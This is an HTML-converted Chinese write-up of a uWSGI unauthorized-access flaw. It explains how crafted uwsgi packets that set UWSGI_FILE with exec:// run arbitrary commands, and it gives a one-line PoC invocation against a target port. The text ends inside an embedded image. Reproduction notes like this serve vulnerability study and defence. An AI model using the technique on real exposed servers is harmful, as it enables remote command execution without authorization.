<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>uWSGI 未授权访问漏洞</h1><h2>一、漏洞简介</h2><p>WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行Python WEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。</p><p>uWSGI支持通过魔术变量（Magic Variables）的方式动态配置后端Web应用。如果其端口暴露在外，攻击者可以构造uwsgi数据包，并指定魔术变量UWSGI_FILE，运用exec://协议执行任意命令。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>使用poc.py，执行命令python poc.py -u your-ip:8000 -c "touch /tmp/success"：</p><p><img height="102px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdYAAABWCAYAAABy3bc2AAA3VUlEQVR4nO29e5Bk1X3n+f2dc/NmvV+9iCoKqAKzNrP2RNOKBoUKsMZjjZfBrF4rhAjcq9iuNniMAyZ6ghiPJMDQEoqZnsAreVhLDNUxjg4NanWMJAiMez2SIySY1vAYmpbZWeyVoAq61CWxVNcrqyrvvef32z/OPTdvZmVWZtaju7rqfiI6oPI+zr0nT57f+T3O70evnfqJfOKvfHR/6xPIyLjYEIExeTOrAtUKAArUysQF0RIBgI50FysusCeBCqkFBBFPihRSXolqF7HnmTzPAYAX6F4AdMFeKGNLwsQFyUmRIvIVq46yY4oX2JNAB6qdQHn3MQBEvpkBADLkiZZIxeOu0TY5J0UVUU6x6ozvNw0AKqQWJapto94vY2NRF/oBMjLWAxG0F+gewApV+yFATJ6OdDcAEk8CAHATkQDgnBQFEgIloUqGvPP/BhkXCwKA47GU+giIF2LG54JAiqgQqioinwRKB6qdc1Jk4kJDDZK9P3sSsuJ5AHALyIytTTaRZGwHVCJUAShONAJm4iWKKEepYxRITgBjfDtZ6UB1cI4LZCiHTFvNqIIS1c4wReJEGWFWvCSeFClQrSpE3i7WwCYlUAHAabix0LUXExfqaa6KVQcinnfj2WgzKxqGBESSLQK3MtmXk7FtMdrMi4bRRdVFRF7K7LsAADqw5jX2uACCpIVzRkYaZ90QZbVRAEo8KQoADWplSEGFlGefl8iQRwJVaTImUF4HCsbnggoTk/GqxEJVARDRMACgQ927cW+WsRlkgjVj2yEikRBC0TAqohwIIpDQ5BMNtRMACJQTgREFJkOeQAIC+bAmvkxz3SHEmqQiUK7WOe5YSiAyRZQXT4oARIlqdyZeZSif8rWWtSPKLu44J0WEjAb8rcp4ZkYUWEWUI7ZacMbWJvOxZmxL2OclACCmFgCSMvsmQhUARPEyAJDY34LJmXMmZ015GdsfgfWZCpX5TleeJ1ZbFG01V8RzZ8o0DCWqXYWUT/la0+0UAYC98s/rwYrniUkDgHgSVhPYGVuPTGPN2Faw4nn2JCQBUUR5WKG6oALVSoACwZBQ3mieU0w+5+xEJ1pC9iQgA61YZZPXNicWdGT8xC3QISIRCEIgjQqlgwhaReSToRaQHWeANQ2LiCFa6fNMC1fjW21Wh6pNSAwxecbnwmpaKxMX2LOC3LkzNur9MzaX7IvK2FaQUW3kmVkd6m7Ek6Mu6m4iaACIcmYawKKKKM8eL+mi6hIlRSWqPWUKztimOGGXCLqi6gJBIElk7zwAxJHmiXBlyBJ7EpCSiCK78BJPQhVSS1rgKVHtCNn6USPKOw1VhzYinYRaSAgrNNrY/5++FwnldGi11UyoXlxkX1bGtoIIWge6r/Iz9/9eoHsFEhLIB6MdBLgIy0yobl+qCtTSQUq2XAms3KuAYMeQKDByvKxC1UYB+ax52RqJV8KeFFVEeRLSJNRSfr9SIBMiFvYkIIaOt4i5c/yVT5JxMZD5WDN2HJkA3VmsKlRR2sesi7pbBbqLYPegOi2yEh3qbgLlOceLFe2EQrLsfK3u80qhmpxPYoDS3lgVqRbn8824uDmvgvWag5O4/Y4ay7tt0H7fHb/E6NFJ++/gUsVRg72HJ/HRm9Z69/rXX+j+bYwlfPToJEYPz6Ov4sh5ev6tEe1bGMTJM5fg2gv9HCvoxuGfXbtFn605BFIUSNH4XLBCtQv/+u8ub/un8XGT5zmT5zld1N26qLsBESLoJOsDkUKc7IFAvhfovjj4zX7OUChtvxHj8zyrkmBUoTUFVzP7ikjEOVkGAB2odpe1KVv0bQ8aF6w3zZSERvyv2Unwp9/pAvYurphQzxeb3f70sQ9gbN8gvvtczaj9TeVC9+96udifv2GiS3BsKo9v9r+HNy/0s2xDKgWqLqoum6xhDv+hL497p3vnrk4LVJIIJJEoCZh40Qt0X5zhSKEyiKm0JUeJhlGh6jCemYl8c05F5BNbk3FlQJJAik6gJgK9XKBmAXPbiCY11nb8cN8gxvYNYuzBLuC2qeaE63gb3sYcPrhmrW2dXOj2N5uL4v1a8f19gxh7oBPTlYcuiudfLy24d2oXsOvneGJLRjjM4oFfeRMjl198Qp8hS5UCNY6mVYpt8ND/c8nPFv9MLmn78i/buqEkhJLQnU9COYojwldLFiICY7SZBeLkIgDF+Xw74iC4EKjYfkNiMoG6c1j7T3u8E8e/YTB6zzyuOdaDnyYHlvDRo9MYOtWHsccrx6bGq8+0Y/Tj8+h7sXJiNdh7+H3giU70HJrGEAAryEv3vubgJPZM9uMHeB+fvM1uJ5v4xiC+/2JF2+7PqS58t2wCX6X9m2Yweg/K2iv/zGDv4Sn0PFNqr++OX+KTg51V3nM10s+Yfr9G71/r+jrvV+f+rm+PH9OrXGP/3t3vjle2X9H/AIAcTj/4Abw6HrcXf29Y0/hYrX/qj58Vz79ifCD+zkupXOeeq+iTesfrUdiFu/A+9vcsVxxowb1nhjHc+yYeiHWda2euxpHwfYxcMotb37sWn8uN446y6yqvsX/flRge5/GlX5nE88n53Tj8swHcWNZugG8OvYUnvLi992NLZNdZjFwy2/h71Xl+e/wyoP99DE+4Z6h8vornz7+P/ZUCvjCIk1OdyZ/v7rJ94nyTJrq08Fc/70D3Uq4LACZ3Tag7e5aTvL0A8Pyl7y1+7v/d1flPuye95xL/qo0OZo8Lismv5RcFbDCcy4LkIopdknwHKy4oVu1Jvt+U2ddelgnU7cz61sxnNOawhJ5hAOMNXvNiHhP3zOPq4U5Mr7gmxO5D8zj94CC+P24F6UcO5vHT1ATcddsUPnmqD2P7Wu3EmkzCBnsPT6P3uX6MHdNwk+gnD3rlE3it9l/MY+KeaQzf1IOfuol7MABOdaYm5vUzdI97P/t8e+7oxE+bmJhL11fvn9X7tzbTkzl0DQYAai8S+u54H7vP9mHsgernXHMwtaAansfth+Zw7htWqAKxqfyYE4g1Glnj81vS42dl//bdMQ88MYixccCNj9++o60kGG+aweg9AU4/OJg8cxn1jjfArYudeLdjvGlt8K1cgCvCPIBKgVzi2pnLcFf+LEYury4Qb31vADc6gRldgmMTu/BO/1uJ5vxmz1sY6XECsckHbAgfd03swjeH3sQDnhWin5tpwfPxYuHamV1A/5sY8QAnZB+ZmS8tJgqDODmVxzeH3lyh7RPIl6X+hRfPtnR868qf0dc9UkApEb4TaEIScW6h+KP8B+TmJUQnSPcIxLAnNhBJSyQMj1a64hkpC58z+aajeAHA+GZaYKvPMPGiC0zKBOrOYn3BS+Mezq34MDb11dTiWvHac8DuT1UG91gmUhPxT19uBwaicp/bVBe+G997+qVWzPUbe/ymeezub8epREhpvPpEF+b2FHFNQ+234rXnchi6wX1ucPVe4PR3NjZ9bOn9NN561QmztVwf90/D77c605OlmIlSEFGAnv4cZs6kTlzRnmMJw3uAiZfj/hpvw9tTQO9gs8FIa3t+x2r9O32sJyUQK48b7P14AXPP7aohNOsdb4QWXFUE3snVFo61eDNXin+59b1rcWymBUAew8UA4+mpeq4Dt1a9Qzd+aw74L22x0PXm8aM8cGVYUzHbFP5LIsiX8YMOt1iwvNkzmRKYlcdbcO+5Trxb04Tegj+c7spP9U3lvu6RF/lmJvLNjDO7xokfrJk3DPJ/3xUtXBm0KBFh1rIELRGUGB3ovnQ5NiFZFkjIqjwCWEe6W0c60VKZuMDEBYHNxqREtYmWMDP77kzWp7EOR+gFMNPkZdMvtWLuUBHXoLW+NhgLTmeum3u1rWS6G+/E8X2pc6f0Sr9dE+2XfT68iKvQih+MN/JGF4gzGnNVNtE11b/pe308Qh+WMIx2nEsEjo+Z8fi+xz6AHw5O4iNHC/gIKs2gPmamgN03LAEvtgLDi7iqP4e3X2rCTLqe52+EWIsu22txyv1PgJ5+4Nxkreetd7wR8hhuKqFd+tIA757zcS268VuYxzuJwCni7ZTG+aXwWnzxZ9fiiyiZSd1543ngrsVuoH0WiDrxm8UAP+pvQsjHWu4VyQeVptx1suL+QOnLsn33Tm+t583jqmVS7/QsS6WWCgAQUOSbaS/Qvay4MJ4LcNVyS46oCGXQYrQseKXk9gxAsbLbczhntVkVrMghrQAb5UuIMykB0JEtY6gj3Z0lHdmZrEuw9n1oCV2pibdhxjtx6tRkY2bQBoUlgBVCGJeb8km0XvvjbXh7agrDN/VgenAJeHVX421fCC436KrWP830b3KNh3P9RfTdZNA72YlTg/O4Zlijd0rjtdRpP318MBZ2S/jo0SncDidcNWbOAtgzjdGj9ty55/rXpt2t5fnrsoSPHpoDEldBpUnaLgx6al5f73gjWOE2vJZLvQDvFDtwdcHHlbn38RfhLtwaBbgyH+Ct1GnPX/Imnr8EsP7UYRyDE67LeDsPYG4AJ+cGAFjB21QAlfce7viV99by9A3QjcMTu4Bd4xhJTMNpk3S9viviv/eEs1fmDQiASgnV0v5V3Q0CKVYd1xRaF9/onJoxnlEgiA5Uu/GsQE5VsAEQ5wO2n1Xah1kE4vbBVkuSnwnVnUfkm+m1m4JvmsEnbwsx8Y2eCq0i3qe4Yh9nOT99uR1dq26tWMJH7ymUa6ir8WIeEyhgTxKl7Ex31X2k1du35sHewSVcvddPmZVLJKbN+P03msbvH79fjf6p1b/17t8zCLz9ksb0ZIDhTxl0nfVq9L8VNAnD89izJxU1vm+wuaCeDXr+eiQa5/A8frvsevvdD90zU8PUXe94I1jhtpr5NTlWGCwFEqW4KgR+1LGMt3J5/NY5H1fkgxr+2mK5iTi6BJ+bm8eXfuVNjMT/7lgRQLV+6j1/PRIzeXQJHim73pqGb5warGHqXsZLGr03/HIA/0RABMqzx8vG54IX6F4v0L2ieZEVzzP8pctglt/jIE+GcipQnezxkjKqBQTRoWojhlYhtaiQWnSkeyqzecUol7yfAChWnZm5d+diNM9FvpkmhmpSYy0kZkAb7bn2IA682InTH5/CB2/qTEX1AkP3TGL0Hvv/zUVctuL7+/rw0aNTGL0t/uhUX6KdNNr+9LFOnDs6jd2n+jBWdoH12V51KL7/VBd++FwOH0k0nsqI2Vhzqxr9Wo1697c03D8r3q/e/X3MTE1j994ufPcYMI1W9B6aw9xzzo1U+X4o799YyyyNj8pnbLJ/mn7+elgf+ieT/mvH6edy2J26fvrYB/Bd/BKfPDqZvEO6j+sdb4Tn2+bxxalduLWn0oS6jCf638dvTgzj5PsA8u/jS7sCfLFMYxvAXQvvY38P8GbHPK6c2IV3d70fH6+MCIaN7HXC03sPf9FVMhM7Subiyutjzbbh6OB6z1+PWYzt2oUjU9fiJABgHt/cFeCu1PVv9ryF/bgaR1LvkDZ3v9nzFu5ruRxfm/gf5aBgum/Z75vYNc539C0uCEFAIiAwRR304eICnt2l2pUAAokS822oW0QkUqw89nleBapztZQiJMjpQKlMM91R2Ehv4sX0fmVtVBdLXATktVM/kU/8lY/ub33i/D/eTTMY/biOtzys3E5xftvfhpzP9xuex+2HDE6lt7cMz+P2Q0t4+8EPrG0Bti2/HyvAfrOjcuvMJhNdgmMTPv4i7RONLsGxiU78aOitLbqntnlEYEzezKpAtSpQq6uRKtqmJ9SR7vro9DWFfd476nNdQRsrLognRQopr0S1uzSGJs9zJCAd6h5slWxdGVsFYeJFyUmRIvLTBe1Z8QJ7ElzYn9OLPRg7X0J0K7a/2ZzP96viz16zD96xLb8fp9ldhns7zqNAK/rlQUEArl3oxBWp4KftABEoXZlGiWpnxQW3Lebqpcun/zn/f/gXnYHdJiMgAaCEfJcVKbmZrYOaCdWMSkg8CQSALglV54MnFVF+G/2kMi4oL/bghzdUmoIrEzRkALBBQP0+Tk5dgh+crwxH7ZP40gpT8AZH9W4NVsSNKHbmum6+61yAP718Ovd3rGw5NiZfB+S5cnE6UB2c4wKFqmW17EsZOxsVqg7j87yIRETkseIl8aRIgWoFCV9YU3BGRkbGecBoMysapmZlmyDOnCSkOGfmVag70+UGMzLSsLK+VK8U1MbGNzMUUV6xas/KxmVkZGxrRCQio3wAEC1LLs1gpVBNEuwLVc6LWVXUHYTL9bwaLoWl8+Hb60pkpuCMjIxtTYUAlbTZF9YtmwPiSZJsoJMILxlPgjiAqbf23TO2C0m+aZ8XVBzMVvNcgYkzbLlzbLIQJSG4qZSGvfiNf/JZ/K+f+ix+5ze24jgbxme+fBT3j1zo58jY3tyM+8eO4siX76woNpCxbkYO4sjYYXxmCBi6/TCOjB3Een7OrHg+8s00ASApCVAVqNY4zSGDYCLfTBvNc5yTIuekSAJiTwIy0GA3R278/DJy31E8dvvwxt3wImv/vFNjfKXKDC4Ynxd0oDqIKS8ikUBCkZXp7YigRYFFJGLFBVZ2saZCG8zUhMZ6Dm/852/hje7d+J3f/jB+493n8UYzxS82iJH7juK2sw/i88fHz3/jFxmxSUOyPXYXCzfj/rG7sTv5+xSeGn083tcJ2Mn9EG5xe4FPP4n9X3shdf16j299mvn9K1adVIQhm1HfCkghrQjWLAxZNjleVBHlRUvg/K9EtPmWvKE7cdvuU3jua+NlH5+3+a1G+zuJIIyKBpLKzFXd/x5HmZcVYWDIEjGUEML4GABAlAQk5DU/gGbfwc/n/wEuu6IXb8yuTMGfsTWwqyxSJm9myZCnjaqa3TGjWV7AV0c3QxgN4zNfvhsY24f9sSQdue8oDtx3M07Gwm/kvkO45RdPYv8XXoATwo/d/m4yCa/3+AVn8iymAJyZACYGzwJTZzG5zltWBiBV/u0FulcgYVzi7bwxdMMHgRNPpBZN55cL3f4FITW+xgfeLeIXZ/FOHaFKNsf0TCxcEwjQrMDi8xIJSIWqDZDQFXBY88qsc+BKdL9xDo0rrcP4zJfvBZ58FgMPuVV5akU+chBHRlG+Qk99Nnn7YTzsltq7D+HILfE5K1bd6VV/5Yq/QiOYeh6PfOFpTDTyfOt9v7rtp995T/Ln1IlGV6+2fXnyWRl48PcxHM7OAn+L//hHf65fFuh6/bv+H5jVhgb+ch++Gt9s6PbDeHjg2ca0ooaer973t3r7Thv4Bu5NxtLpsdL59RhKj8Gq2mAj4yd+hxXXX4GB/imcTUmSybNTwIBr/E7ctnsKJx5117yA7534GB6+7sMYOj6OifUeb6wL6rPm8Qtg4ml8fjT+/5OPJwsMoKLva/7+mxsfw5/+ty3x+ChZdOo+/2rzS6PcjE/cArz+aOm+dd9v5CCO7D2LE5feilv6p3Bi7DVcN3or+pN3bGb+Wtk+Un2UWDTKrm/w912v/1Y93qTFpZ5Fp/L4xNP4V6NSBADz2p8WDrxmBWpZBeqkPq/d98x5W9A+8s2MLqouZ80g2P+m9kwzCQixZtu8YL3i1/FrnQAwiCu6T2O2KXNwP2556GM48eg+fHWiYkV+8hWcHr0b148AJ92Kfe8e4PSTtmOOP4D9x+ubSnaPuvvbTr7t9mGcPD4OpxFceuJB7E/+PoSH7zuT+vLSz1d5/Trfr5H2Rw7iyOgATjy6D9+uM9Ox4gUAYE+C+MslkUvx4T/+R+f+5it34f94m3I3/MGT+MN7/1Hnq43074Wm7vM18v3Vp/+WQ3j49JPYP/qCnRh+904MnXy6IcEyEY9BO6FUvfsq3389XsArp+/GgYcO4szo4zg5dCfuuaUfp8fiawcH0D/1Gl5yDzpyMJ6IBzAIYGK9xxt4wro0MX6bZaLu738DxkcDz197fmmcods/ht2nn8VXU23Ufz8Au2/FwNg+PLX3KA6MDuCp0Sdx/djH8KGhpzExATQ6/qq1bz+/N2XRWAP1+q/O8XKLiu3ftEWl3vOtdlwQC1S/FMULAFCIwPAqBSogAgA60H2Rb6ZVoFqJyqLFVWqrDYw288kdAWl6u82Vg5dj/u//K/5uvguXXdF8ENPpsQeSTj356ing0svjIJAX8L0TU9i99+b4zJtx/e4pnHimuS+5dP9xvPT6FPoH4nwzI5/CLf2n8FwyYMfx7Sefx9Tu68sCJGpev973q9v+MD7zu3swdeKJhiYlYvJdEWUXHr5kZs/939/8Ezz7NvkA6NXX/74z3b/fff5MuN7+3TzqfP8Nfn91mXoej8QTzcTLr2Gq3wqWjaL2+Ha8gK+O7qs62Z/82j7sHwMOjB3FkYc+iNcfraJND92Jx8aOxpr8kziNAVw+tIHH10xz43fDWff4aOz51zs/AMP40HX9OP3qGn53U8/je/F4mDrxnaoL4vrjr077zf6eUvddvf/qHb8Z1+8+haeS38U4vv2Xp9B/3YfLn7/e81U5XilUdVF1qagUd7JCqJJEIBhRdn5VgXKJQmrKS210txBEIKHxzGxzGmv3blx72Rx+/oNxvIv/Cb/WtDm4Cv2lFfPEy69h6qHrMYIXcHLk+qqrqnWxAT6bpkm93+rtX4GBfuAXk+MN39oLdI/xzYwdMEFBi+97hpDOXYn+AfwPnpl5iyATr5zqmLp1Hf07dCcee+hWlPLwr9UUVp263/8GfH9Tr/+4pJ2lTY/A5rxff+Ma4ch9R3Hg0ufxyOjjmBg5iCMPHcV1aVNZ/614+KFTeGp0n32moTtxG87ilQkAg+s83gir9k/z43fDWdf4OE/PP/Ip3ILn8cj5MhNVjr9V2p84/gCeGjiKA2NHcQBNmvHr9l+d40OX41LsSdpOmDrb8PNVHn/3L79QfOg7EyuCk4hICYQAwOR4UYeqDUw5KAkhoOT8QHWKwChaPQOXCAx7ZoEYSpQUiUk3JVi7rxhE58//exwNPIn5X12LObiC9I9h4sd4feoQrh8BsHcPTr/6+DpuXIXKQTY4kJokNon0+63a/rtIu9TqIATKRb45BwB29aWQz7V1tKSsFUYWZ+fP/AI/V2ABQO+8nHt96n9Ze/9OPI3Pjz7d3DVN3b/O97/Z399mvF+jk33iA43N0icfx34cxJHRT2Hk+OM4OXkWUxjA64+mBP3gAPrd/dd7vBFW7Z+mxu/msK7xcX6ef2TvHky9/p2N82nXo+L7rdf+ya/tS8UzHMJjaFS41uu/Rvq3/kK23vO544IbgwN//kDhX+mv4CvfnkwEKmD9pYCtn8uehBBoQEQEwj4vOgHMniwqhg+hVTNwmdgPCwAgCXWoe5vax3rFQBcm3Ypj9jTe/PnazMGWm3H/6J5yDSJW/3f/7mHcdmnJ7JFm8uzUSvNAI5x8BaexB7cl+7acaaK6SWX9VLxf3fataWn36Kp79wRDn5U//vM/O/f4Ix8/NxSR70waxMoXsX4Bo82s0R+a/YN9/1B+8ZOX5Wyg+6w/oH7/rpdLB+P3S3x4zbDK8zX4/a2v/Y2k2viOPx87iiP33Vzlmn4MpOzSI3v3lCbGiR/j9al+3HK32z8bv7+7/3qPr5uGxu+6qfn7X/f4OA/P77a4rCKo1jy/raDK+Gug/RJWEFay9v6rc3zix3h9ag8OVP1dNP58DlETwcx77R1t7HUQkSIiFflmJvLNjA5Uuw5Uu2LVqULKG5/nQWAFyutAdbIni+zJIpQYzvFildszUltsvED3EUN7ge5zyUQa11iv+HX8WucZvPJu6aN3Js/g+uv/Z/wO/i/89RuNbb3ZPWr9O0ANU0McxHLpieo/+InjT+DEdYfw8Fhc7rjhvXgv4KujwP1jFRF3G7zVoPb71W9/4vgDeASH8XDKHJK6hwBA5C2dAwBftBWoRrWK5iX2zOJyNI+rf+//pH/3e4BA5Jc/eAyP/afJnrIHrNO/a8f6tK57KH6/qefx1IkBHGhWBaj5fPX6b4Par0llxOHdODJ294rxV3d812LiaXx+bABHUteXR7WO49tfeBD4cmnsl99/vcfXT53xu0Ft1Pr9r398bPbzD93wQfSffnbVhfza5zfLauNv9fYrxzc2vP9WP14an0fG7k7uWTpe7/lWHO+ITn09vPs/veMBEKel6iDOlESQikSVInDaKwAtEQRUWeBeSJYh0KKkmHa5xdWTkr2u5zEJ/8pw7ercjPvHPoazjz5wYYIg1kyj79c0LAJx5ganoVbUAJxn7/Lwk5//gur/6z/A118GXOHmSgQ3Bv987BP+1u3f7PvP2I5s9riuN/4u1t/V2hCxiUFWCNQY50f1At3HihcgICWqVSCR8XnBRfwyZEmB8sYzc8SUY88GQhEAHeheVJQVFLGBT1suV/DIfXaP34YGLV3EMKTIeV4ihiImrywwCaWqHSREAKRVdLeKJDS+mU5/8azsQNr7h58t/oPXnm776gRazv/b1Cf7/jO2J5uVWORiaf/8E/lmhgColFAtBTK5CGAAAsU5WWYYKzRtUohpG4wEZmCJGJo9KaqQ8qIljDXUypQinGRrOg/v1xAj9x3Fgd2IzV87awCshgK1UqjI5HiRTOmLNJ5diQFOcpJuzXV1iUhkfC4QQxnPzBLb/Kh7//CJ4u/9OtD53otdX3ro5JYrh5V9/xkZGRsFUZwUHwDneFGHutd4ZtazygZYx3kAtEQUqhYyoonJI6Y853hBR3aLDUXUIiTLYHiiJFCi2hBVb5NR0mazeqwXAUJxTtOQ8vEHSnxegoAgIFHgOG1hB+IsIG61RhHlnfkiHlQSnwNWPO/KH2VkZGRsMyTyzbnYbNuHOOCIFRfEzpwCAgtByEBrY7VYV7w8uYlIBADs87wKVOdquaS3rCk4YyUk1KJDhTLhCsBFoBnPzEBLBJMIzEXASlDxpOiVO+CJyR5nT0KBma500GdkZGRc7IiAdVF3C0kQ+0pbmbggShhIAo6s8GXKseKCeFKkkPIk5DmBmkrG3wtaPaN0LHTXkIQ/Y9NwX+RqKyLOSVGFaEkJQxEF1oFqd35Ul5EJAIhTFRmcQM3JMpDUo8zIyMjYdsQFF5hQSvCgRLU7Uy4TFyQnRV3U3UTQEIBDJgiRQEKT5/nKWzbadtOCNfGFAdWTyAMYue8wLn+mWvRZeZLsZhKgbwbV83LGz1jj3daCQIqEkqa54nhqZaTi1VLlOWmttSJM3LpYfS64j71A96Wj4kzOnKOI8oOffnj5gX/8AXR5XT34yb/HgT97semUls2QlfjLyMi4wNSa45hzsU80rngkIhGBPONb/6sOVCcAYZ8XqJTWsCHWpLHW2ts1ct9RXP/qPnzv7Flcnvq7JDxdZFocGr7iDpX1KC+88F0vsc3dhX+vCBqqNDeIgmFjzRbV7qdD1WZ8XqRQFAm1GG234aSFKlBarbnrOCfL7z7zJzh4XPdc+el/gz+5jDZVqGZkZGRsVVzSfF1UXXZ+jufhcqEK9qyVj4T8ZsoKbqgp+OTX9gH3HcXDuwHcctQK4IaFYmV1igvFxoalO4EJACqkvBIb+l0pUOP9qbJaMBEJtTDiTCACJZBAG93NwgtkqCVtQnZmXwAQghBD6Uh3AVBE57HwZEZGRsYWQUQiIYSiYQAABE6bfZ1AJdjdFC4wFCQGIA2rw9SdQDfVx9pUQuuhD+O6/im8/vJq16xWr6+ReoQrs3ekcjxvQL3NlRq3MZNdz/zrB+a+9y4gWkIJywUqCYgM+Yqvbm/k+T/75UNtH+lbkiKKC3brzDGMG2qhG/+Fd2QU+PqBf1v4rwBxTpZxwz/Dkf+ttfPrf/T4/CsAGc/Mxw77GtSrF1vRf/WOV/RvRkZGxoUkUWRCaiGhnPETgdoBJHVWSUiWBWIAgAQq0WRD1UZCdXMAbKg50Jl+HzlxCice3YdX9h7F/Y0m3nS5TB86jM/USJSZ1Osb3Yf9ow/ixKV347EkNyjg6hGefTQ+PpXOHVp5/T48dbriEY4/gP2j+/DIiVpJKOvdPy5gPboP+x99HlMAfnLkX+K5n+k+Yigy5IMgaS1WKO0xTd9/H546XZ47c+j2TwFP7sM/u/cA33f/V/CM3DR396eHmIg8nHwFLwe/Vvjgh0rBSTfvubFH/e1/068FukdUvEKrScpi4PoXt+LhKu2nj9/TRP9mZGRkXChYWSEaFyQHgXI6UB1xWTgBWdeZ0XZ+dj5Y0bYsJ5mVrrxabKhgPfk16w8dHBgo+7sxxvHtL+zDIyeAWx46iiNjRyuEZmP1+mrWS4wTUD/VRN7NatSux3gzrt+NUp3DiR/j9Slg4IqrPBGJyJDPOVk2Ps+riPLuHwCAS/7O1eopThx/HN+eABSrTuJ39X/72/cwcNmVihUXWP1w4Zm/OVP81b0fKuqi7vaCj/TccN0v1V8/+6ISseHlomBMzlRP6txAPUvXvju+Gf2bsXkIJBSUIsYzMnYSZFSbLupuHepuJaoNACCkFajVBZdGvjlHAs0eL+mi6lIh5XWoe71A92mjuxvRVoFNMgWf/NoDa7524vgD2H8cce3HQzgyEJtkG6jXd2Gx1RZu2XszcPIFYOjD+IeXTEavvfR22o+aBwDF1s9qNM+RIY99XqJAPAC5FbdNl8JK1cOcCWYMACy8EcwpVl3GMzM/f+nvOha+OEI30iv65MgNST1TIvJ0oDohdQKW6pUQW1GPE0CmlV4MiAjY5HmeDHkkEroxmJGxU6gWPJr+jITyOlCKQD4Y7SCg2g6NRti6+1gnnsY3TnwQD19nNTarKG1sYe2NZRxnfgFg993490+ORgDws//8+blvTfEKgerQRnUZ30wTSs7yFSTC7mbc/9CtQBzcJZDOy25/aP7BDygPAFSk2umdl3NvvFe9nimBcnVd7qvWsyxvH4h90he0AGdGGqPNrMseE2MrIsV1e8mQB4go1plQzchYCRFskZP1soW3XAzjQ9f1A784k6on2Uy9vgomzuAX2GOFDqxQOLB79UuaIjaFPrn/96IDv/85/O9/tG/uS8+8W1OoOlSgOgQAK1MoP1K9nqcLCJOhTwe//4+vyC9TtBzvv8qtq95qg/Usk4C0oTtxTzpKqdH+HboTj40dxZEv37kBNSczHKxscAVKW6zKhKqK7MKtQvBmZGRsAltHYx05iCOje8o/K4vMrVevrx4v4Ktj15fqXZ5+Eo+c+BjuSY6vXm+TlSmwMXnU6DOZ+I/Bs6f+A33m6/9u/jMAfPg+AJr7m6+0f/74uFS7BgBExZuUjcoDq9dz/d6Jj+Hh5Pip9u/+1Zlzv30pUVmmppr1TOvVE61Xz3JF+zhxYgq3JBprvf7N2CwEEhCTz74sRNoWcnZVPKqVGYyvCWtaSTIyMtZF00n4NyabzsVVu5IVz4snoaCUgGEFQ3fij/+4c/r793499zJAilUHhu7E5//lr8787eGH8N1Jm7ey0s4vIpHJ85yKhnKfPfSVzkb7RMhG/nKOFymklsQZv8PqLmYksPHNjFvB1RKoripSnAazMxOuGRkbzxY2BW8dFKtOSB0P5eAABkRpn1Wnm8yGbvggrvJmOyYnrXlONC/DmupKGZE8WbRtNOz3EsAmixCBqEB1KCml27Jbfp7NhOrOQWATic8IrEBVEfmKVUdaqBptZo02syAIFNgLdF8mVDMyNoc1mYL7b4nNhU3n063IFbyWxi8QcT2/mcg301W11pOP49jeo90Hxm5MRS2fwpP7/xSvke4jzXPsSVFgihRRzmVY0kZ1RdpMGz+aAVBVG47TISrjmdl0god02sOsnumOpNKP6gMAMfkCCWLBSS7tJeI901k1o4yMzSWrx1qFpP6ex4V0sIfxzIzEq/2m7wkJWcuSaIls0fq4IG5EPnsSxGY5DwCEpEhCeVa8SELa5Gx6Ql1UXcDq1W8ydgQMgCoFqmLVIQJj8maWGCqxsjiBGumeC/S8GRk7imyCrgbBuOAPZl5UoloAOzGtqrWuekvKaUM5iWCEJBCfl+J6qQEAuNRaJCAhCAGL1l9WinsSQlgrOX/GjoBFICZvNdBqflTRcS1eBXYlA1Wk2quZfVnxPDHlN2qLQUZGhiXzsab8nWm8QPeS2Jy7xjczrtapI/LN9FoaI4JWoFYv0H1J5qXVzo/TaKkmyxZlbEuUkF2IJUKzMtqXbJYtl7ZNRaoVNrBpGqlVWjKeCewC4TIyMjaGHauxGs/MEJN2vk6XH5IE5D5ToWpjzcuiYUAQEYmc1iqqukBuAhaCS/JMOtS9sV/MZ/CigmoTkmUSaqmX5Tdj50BkBaatulEKqDOemYGA4Kp2MGltVJeLOo8FMTmByp7d5qWL1EpEDedAzcjIqM9O1VhZFJg9CY0Xm9UMtYqWiKRkMiNQXhvdrQPVqY3qSvs2iaHWqrUCAIOXoSVSEeV0aH1fziSnYLfONJqXMmPnEBe8b3N/M2TJ+GYaCgwFVrEfXpu4WgeR8mwRBja+mWZPiuxJ0Qt0rxfonnhMExMXXJLyjIyM9bFTBauq9JEKSahCaokDhRJt1GU1SicvrxEEIk0kOBf2ZVkAEFMLGqjvl5GRRoeqjXNSBAlToFp1oPt0qHs5xws2OM5W5GDFS6xivyvsPux47BMAxcSLTLzIOSmKZ6/JyMhYHztVsAKwk4woGOOZWSWqTXQiGJN+ISKvmmaqI91TqbWyn6SVq5lpCQCYeInQXBmijJ2Hi06vpNKSkQ5o05HudoMvZfZNFnwuQQQAMFmB68oM2vSaWfWbjIz1suN8rAIJjc/zXqB7ULGw0JHujicbif8p53tdrdBt5JtpYigYaFY873y0VdsXGPbtROZleVszqiAiUVy3d16FlFeyMs90bBKGyfEiAibnPmBlNVb2ue